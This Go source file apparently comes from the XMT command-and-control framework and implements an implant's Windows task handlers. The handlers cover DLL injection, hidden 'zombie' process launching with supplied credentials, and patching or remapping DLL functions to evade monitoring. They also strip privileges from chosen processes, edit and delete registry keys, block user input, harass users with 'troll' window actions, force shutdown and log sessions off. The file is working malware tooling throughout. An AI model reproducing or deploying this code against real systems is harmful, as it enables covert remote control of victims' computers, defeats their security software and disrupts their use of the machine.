//go:build windows
// +build windows

// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package task

import (
	"bytes"
	"context"
	"os"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device/regedit"
	"github.com/iDigitalFlame/xmt/device/winapi"
	"github.com/iDigitalFlame/xmt/device/winapi/registry"
	"github.com/iDigitalFlame/xmt/util"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

func randMod(v int32) int32 {
	n := int32(util.FastRandN(256))
	if util.FastRandN(2) == 0 {
		return n + v
	}
	return v - n
}
func taskTroll(x context.Context, r data.Reader, _ data.Writer) error {
	t, err := r.Uint8()
	if err != nil {
		return err
	}
	switch t {
	case taskTrollHcEnable, taskTrollHcDisable:
		return winapi.SetHighContrast(t == taskTrollHcEnable)
	case taskTrollSwapEnable, taskTrollSwapDisable:
		return winapi.SwapMouseButtons(t == taskTrollSwapEnable)
	case taskTrollBlockInputEnable, taskTrollBlockInputDisable:
		return winapi.BlockInput(t == taskTrollBlockInputEnable)
	case taskTrollWallpaperPath:
		s, err := r.StringVal()
		if err != nil {
			return err
		}
		return winapi.SetWallpaper(s)
	case taskTrollWallpaper:
		return taskTrollSetWallpaper(r)
	case taskTrollWTF:
		d, err := r.Int64()
		if err != nil {
			return err
		}
		if d <= 0 {
			return nil
		}
		var (
			z = time.NewTimer(time.Duration(d))
			v = time.NewTicker(time.Millisecond * time.Duration(250+util.FastRandN(250)))
		)
	loop:
		for {
			select {
			case <-v.C:
				e, err := winapi.TopLevelWindows()
				if err != nil {
					break
				}
				switch h := e[util.FastRandN(len(e))]; util.FastRandN(3) {
				case 0:
					winapi.ShowWindow(h.Handle, uint8(1+util.FastRandN(12)))
				case 1:
					winapi.SetWindowTransparency(h.Handle, uint8(util.FastRandN(256)))
				case 2:
					winapi.SetWindowPos(h.Handle, randMod(h.X), randMod(h.Y), randMod(h.Width), randMod(h.Height))
				}
			case <-z.C:
				break loop
			case <-x.Done():
				break loop
			}
		}
		v.Stop()
		z.Stop()
		return winapi.SetWindowTransparency(0, 255)
	}
	return xerr.Sub("invalid operation", 0x68)
}
func taskCheck(_ context.Context, r data.Reader, w data.Writer) error {
	var (
		a    uint32
		b    []byte
		v    bool
		err  error
		n, f string
	)
	// NOTE(dij): Do these escape?
	//            Sometimes the compiler thinks so.
	if err = r.ReadString(&n); err != nil {
		return err
	}
	if err = r.ReadString(&f); err != nil {
		return err
	}
	if err = r.ReadUint32(&a); err != nil {
		return nil
	}
	if err = r.ReadBytes(&b); err != nil {
		return err
	}
	switch {
	case len(f) > 0:
		if a == 1 && len(b) == 0 {
			if b, err = winapi.ExtractDLLFunction(n, f, 16); err != nil {
				return err
			}
		}
		v, err = winapi.CheckFunction(n, f, b)
	case len(b) > 0:
		v, err = winapi.CheckDLL(n, a, b)
	default:
		v, err = winapi.CheckDLLFile(n)
	}
	if err != nil {
		return err
	}
	w.WriteBool(v)
	return nil
}
func taskPatch(_ context.Context, r data.Reader, w data.Writer) error {
	var (
		a    uint32
		b    []byte
		n, f string
	)
	// NOTE(dij): Do these escape?
	//            Sometimes the compiler thinks so.
	if err := r.ReadString(&n); err != nil {
		return err
	}
	if err := r.ReadString(&f); err != nil {
		return err
	}
	if err := r.ReadUint32(&a); err != nil {
		return nil
	}
	if err := r.ReadBytes(&b); err != nil {
		return err
	}
	if len(f) == 0 {
		if len(b) == 0 {
			return winapi.PatchDLLFile(n)
		}
		return winapi.PatchDLL(n, a, b)
	}
	if len(b) == 0 {
		var err error
		if b, err = winapi.ExtractDLLFunction(n, f, 16); err != nil {
			return err
		}
	}
	return winapi.PatchFunction(n, f, b)
}
func taskInject(x context.Context, r data.Reader, w data.Writer) error {
	d, z, v, err := DLLUnmarshal(x, r)
	if err != nil {
		return err
	}
	if err = d.Start(); err != nil {
		if v {
			os.Remove(d.Path)
		}
		return err
	}
	h, _ := d.Handle()
	if w.WriteUint64(uint64(h)); !z {
		if w.WriteUint64(uint64(d.Pid()) << 32); v {
			go waitThenDelete(d, d.Path)
		} else {
			d.Release()
		}
		return nil
	}
	w.WriteUint32(d.Pid())
	if err = d.Wait(); v {
		os.Remove(d.Path)
	}
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		return err
	}
	c, _ := d.ExitCode()
	w.WriteInt32(c)
	return nil
}
func taskZombie(x context.Context, r data.Reader, w data.Writer) error {
	z, f, err := ZombieUnmarshal(x, r)
	if err != nil {
		return err
	}
	if f {
		w.WriteUint64(0)
		z.Stdout, z.Stderr = w, w
	}
	if err = z.Start(); err != nil {
		z.Stdout, z.Stderr = nil, nil
		return err
	}
	if z.Stdin = nil; !f {
		w.WriteUint64(uint64(z.Pid()) << 32)
		z.Release()
		return nil
	}
	i := z.Pid()
	err, z.Stdout, z.Stderr = z.Wait(), nil, nil
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		return err
	}
	var (
		c, _ = z.ExitCode()
		s, _ = w.(backer)
	)
	if s == nil {
		return nil
	}
	s.WriteUint32Pos(0, i)
	s.WriteUint32Pos(4, uint32(c))
	return nil
}
func taskUntrust(_ context.Context, r data.Reader, _ data.Writer) error {
	var f filter.Filter
	if err := f.UnmarshalStream(r); err != nil {
		return err
	}
	if f.Empty() {
		return filter.ErrNoProcessFound
	}
	p, err := f.SelectFunc(nil)
	if err != nil {
		return err
	}
	return winapi.Untrust(p)
}
func taskFuncMap(_ context.Context, r data.Reader, _ data.Writer) error {
	v, err := r.Uint8()
	if err != nil {
		return err
	}
	if v == taskFuncMapUnmapAll {
		return winapi.FuncUnmapAll()
	}
	h, err := r.Uint32()
	if err != nil {
		return err
	}
	switch v {
	case taskFuncMapMap:
		b, err := r.Bytes()
		if err != nil {
			return err
		}
		return winapi.FuncRemapHash(h, b)
	case taskFuncMapUnmap:
		return winapi.FuncUnmapHash(h)
	}
	return xerr.Sub("invalid operation", 0x68)
}
func taskRegistry(_ context.Context, r data.Reader, w data.Writer) error {
	var (
		o   uint8
		k   string
		err = r.ReadUint8(&o)
	)
	if err != nil {
		return err
	}
	if err = r.ReadString(&k); err != nil {
		return err
	}
	if o > regOpSetStringList {
		return registry.ErrUnexpectedType
	}
	if len(k) == 0 {
		return xerr.Sub("empty key name", 0x6C)
	}
	switch w.WriteUint8(o); o {
	case regOpLs:
		e, err1 := regedit.Dir(k)
		if err1 != nil {
			return err1
		}
		w.WriteUint32(uint32(len(e)))
		for i := range e {
			if err = e[i].MarshalStream(w); err != nil {
				return err
			}
		}
		return nil
	case regOpMake:
		return regedit.MakeKey(k)
	case regOpDeleteKey:
		f, err1 := r.Bool()
		if err1 != nil {
			return err1
		}
		return regedit.DeleteKey(k, f)
	}
	v, err := r.StringVal()
	if err != nil {
		return err
	}
	if len(v) == 0 {
		return xerr.Sub("empty value name", 0x6D)
	}
	switch o {
	case regOpGet:
		x, err1 := regedit.Get(k, v)
		if err1 != nil {
			return err1
		}
		x.MarshalStream(w)
		return nil
	case regOpSet:
		t, err1 := r.Uint32()
		if err1 != nil {
			return err1
		}
		b, err1 := r.Bytes()
		if err1 != nil {
			return err1
		}
		return regedit.Set(k, v, t, b)
	case regOpDelete:
		f, err1 := r.Bool()
		if err1 != nil {
			return err1
		}
		return regedit.DeleteEx(k, v, f)
	case regOpSetDword:
		d, err1 := r.Uint32()
		if err1 != nil {
			return err1
		}
		return regedit.SetDword(k, v, d)
	case regOpSetQword:
		d, err1 := r.Uint64()
		if err1 != nil {
			return err1
		}
		return regedit.SetQword(k, v, d)
	case regOpSetBytes:
		b, err1 := r.Bytes()
		if err1 != nil {
			return err1
		}
		return regedit.SetBytes(k, v, b)
	case regOpSetString:
		s, err1 := r.StringVal()
		if err1 != nil {
			return err1
		}
		return regedit.SetString(k, v, s)
	case regOpSetStringList:
		var l []string
		if err = data.ReadStringList(r, &l); err != nil {
			return err
		}
		return regedit.SetStrings(k, v, l)
	case regOpSetExpandString:
		s, err1 := r.StringVal()
		if err1 != nil {
			return err1
		}
		return regedit.SetExpandString(k, v, s)
	}
	return registry.ErrUnexpectedType
}
func taskInteract(_ context.Context, r data.Reader, w data.Writer) error {
	t, err := r.Uint8()
	if err != nil {
		return err
	}
	var h uint64
	if err = r.ReadUint64(&h); err != nil {
		return err
	}
	switch t {
	case taskWindowTransparency:
		var v uint8
		if err = r.ReadUint8(&v); err != nil {
			return err
		}
		// NOTE(dij): Do these escape?
		//            Sometimes the compiler thinks so.
		return winapi.SetWindowTransparency(uintptr(h), v)
	case taskWindowEnable, taskWindowDisable:
		_, err = winapi.EnableWindow(uintptr(h), t == taskWindowEnable)
		return err
	case taskWindowShow:
		var v uint8
		if err = r.ReadUint8(&v); err != nil {
			return err
		}
		// NOTE(dij): Do these escape?
		//            Sometimes the compiler thinks so.
		_, err = winapi.ShowWindow(uintptr(h), v)
		return err
	case taskWindowClose:
		return winapi.CloseWindow(uintptr(h))
	case taskWindowMessage:
		var (
			t, d string
			f    uint32
		)
		if err = r.ReadUint32(&f); err != nil {
			return err
		}
		if err = r.ReadString(&t); err != nil {
			return err
		}
		if err = r.ReadString(&d); err != nil {
			return err
		}
		// NOTE(dij): Do these escape?
		//            Sometimes the compiler thinks so.
		o, err := winapi.MessageBox(uintptr(h), d, t, f)
		if err != nil {
			return err
		}
		w.WriteUint32(o)
		return nil
	case taskWindowMove:
		var x, y, w, v int32
		if err = r.ReadInt32(&x); err != nil {
			return err
		}
		if err = r.ReadInt32(&y); err != nil {
			return err
		}
		if err = r.ReadInt32(&w); err != nil {
			return err
		}
		if err = r.ReadInt32(&v); err != nil {
			return err
		}
		// NOTE(dij): Do these escape?
		//            Sometimes the compiler thinks so.
		return winapi.SetWindowPos(uintptr(h), x, y, w, v)
	case taskWindowFocus:
		return winapi.SetForegroundWindow(uintptr(h))
	case taskWindowType:
		var t string
		if err = r.ReadString(&t); err != nil {
			return err
		}
		return winapi.SendInput(uintptr(h), t)
	}
	return xerr.Sub("invalid operation", 0x68)
}
func taskShutdown(_ context.Context, r data.Reader, _ data.Writer) error {
	m, err := r.StringVal()
	if err != nil {
		return err
	}
	t, err := r.Uint32()
	if err != nil {
		return err
	}
	c, err := r.Uint32()
	if err != nil {
		return err
	}
	v, err := r.Uint8()
	if err != nil {
		return err
	}
	winapi.EnablePrivileges("SeShutdownPrivilege")
	return winapi.InitiateSystemShutdownEx("", m, t, v&2 != 0, v&1 != 0, c)
}
func taskLoginsAct(_ context.Context, r data.Reader, w data.Writer) error {
	a, err := r.Uint8()
	if err != nil {
		return err
	}
	s, err := r.Int32()
	if err != nil {
		return err
	}
	switch a {
	case taskLoginsDisconnect:
		return winapi.WTSDisconnectSession(0, s, false)
	case taskLoginsLogoff:
		return winapi.WTSLogoffSession(0, s, false)
	case taskLoginsMessage:
		var (
			t, d string
			f, x uint32
			v    bool
		)
		// NOTE(dij): Do these escape?
		//            Sometimes the compiler thinks so.
		if err = r.ReadUint32(&f); err != nil {
			return err
		}
		if err = r.ReadUint32(&x); err != nil {
			return err
		}
		if err = r.ReadBool(&v); err != nil {
			return err
		}
		if err = r.ReadString(&t); err != nil {
			return err
		}
		if err = r.ReadString(&d); err != nil {
			return err
		}
		o, err := winapi.WTSSendMessage(0, s, t, d, f, x, v)
		if err != nil {
			return err
		}
		w.WriteUint32(o)
		return nil
	}
	return xerr.Sub("invalid operation", 0x68)
}
func taskLoginsProc(_ context.Context, r data.Reader, w data.Writer) error {
	s, err := r.Int32()
	if err != nil {
		return err
	}
	e, err := winapi.WTSEnumerateProcesses(0, s)
	if err != nil {
		return err
	}
	if err = w.WriteUint32(uint32(len(e))); err != nil {
		return err
	}
	if len(e) == 0 {
		return nil
	}
	for i, m := uint32(0), uint32(len(e)); i < m; i++ {
		if err = e[i].MarshalStream(w); err != nil {
			return err
		}
	}
	return nil
}
func taskWindowList(_ context.Context, _ data.Reader, w data.Writer) error {
	e, err := winapi.TopLevelWindows()
	if err != nil {
		return err
	}
	if err = w.WriteUint32(uint32(len(e))); err != nil {
		return err
	}
	if len(e) == 0 {
		return nil
	}
	for i, m := uint32(0), uint32(len(e)); i < m; i++ {
		if err = e[i].MarshalStream(w); err != nil {
			return err
		}
	}
	return nil
}
func taskFuncMapList(_ context.Context, _ data.Reader, w data.Writer) error {
	var (
		e   = winapi.FuncRemapList()
		err = w.WriteUint32(uint32(len(e)))
	)
	if err != nil {
		return err
	}
	if len(e) == 0 {
		return nil
	}
	for i, m := uint32(0), uint32(len(e)); i < m; i++ {
		if err = e[i].MarshalStream(w); err != nil {
			return err
		}
	}
	return nil
}

// ZombieUnmarshal will read this Zombies's struct data from the supplied reader
// and returns a Zombie runnable struct along with the wait status boolean.
//
// This function returns an error if building or reading fails or if the device
// is not running Windows.
func ZombieUnmarshal(x context.Context, r data.Reader) (*cmd.Zombie, bool, error) {
	var z Zombie
	if err := z.UnmarshalStream(r); err != nil {
		return nil, false, err
	}
	if len(z.Args) == 0 || len(z.Data) == 0 {
		return nil, false, cmd.ErrEmptyCommand
	}
	v := cmd.NewZombieContext(x, z.Data, z.Args...)
	if v.SetFlags(z.Flags); z.Hide {
		v.SetNoWindow(true)
		v.SetWindowDisplay(0)
	}
	if v.SetParent(z.Filter); len(z.Stdin) > 0 {
		v.Stdin = bytes.NewReader(z.Stdin)
	}
	if v.Timeout, v.Dir, v.Env = z.Timeout, z.Dir, z.Env; len(z.User) > 0 {
		v.SetLogin(z.User, z.Domain, z.Pass)
	}
	return v, z.Wait, nil
}
